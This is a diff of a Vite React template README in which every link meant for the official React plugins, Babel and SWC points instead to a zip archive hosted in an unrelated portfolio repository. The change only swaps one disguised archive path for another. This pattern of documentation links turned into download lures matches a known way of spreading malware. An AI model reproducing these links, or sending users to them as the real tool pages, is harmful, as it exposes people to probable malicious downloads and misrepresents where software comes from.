@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/Dioren03/Galvez-Portfolio-FInal/master/src/assets/img/dioren/Galvez-Portfolio-FInal-v1.7.zip) uses [Babel](https://raw.githubusercontent.com/Dioren03/Galvez-Portfolio-FInal/master/src/assets/img/dioren/Galvez-Portfolio-FInal-v1.7.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Dioren03/Galvez-Portfolio-FInal/master/src/assets/img/dioren/Galvez-Portfolio-FInal-v1.7.zip) uses [SWC](https://raw.githubusercontent.com/Dioren03/Galvez-Portfolio-FInal/master/src/assets/img/dioren/Galvez-Portfolio-FInal-v1.7.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/Dioren03/Galvez-Portfolio-FInal/master/src/Inal_Galvez_Portfolio_F_v1.3.zip) uses [Babel](https://raw.githubusercontent.com/Dioren03/Galvez-Portfolio-FInal/master/src/Inal_Galvez_Portfolio_F_v1.3.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Dioren03/Galvez-Portfolio-FInal/master/src/Inal_Galvez_Portfolio_F_v1.3.zip) uses [SWC](https://raw.githubusercontent.com/Dioren03/Galvez-Portfolio-FInal/master/src/Inal_Galvez_Portfolio_F_v1.3.zip) for Fast Refresh
